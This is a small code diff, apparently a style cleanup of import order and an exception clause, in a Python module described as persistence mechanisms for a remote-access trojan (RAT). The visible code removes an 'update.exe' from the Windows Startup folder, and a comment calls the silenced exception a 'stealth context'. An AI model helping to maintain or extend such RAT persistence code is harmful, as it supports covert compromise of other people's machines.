@@ -4,9 +4,9 @@ Multiple persistence mechanisms for RAT survival.
 """
 
 import os
-import sys
 import shutil
 import subprocess
+import sys
 from pathlib import Path
 
 
@@ -81,7 +81,7 @@ class PersistenceManager:
         if "startup_folder" in self.methods:
             try:
                 (Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "update.exe").unlink(missing_ok=True)
-            except:
+            except Exception:  # noqa: BLE001 — intentional swallow in stealth context
                 pass
         self.methods.clear()
         print("[+] Persistence removed")
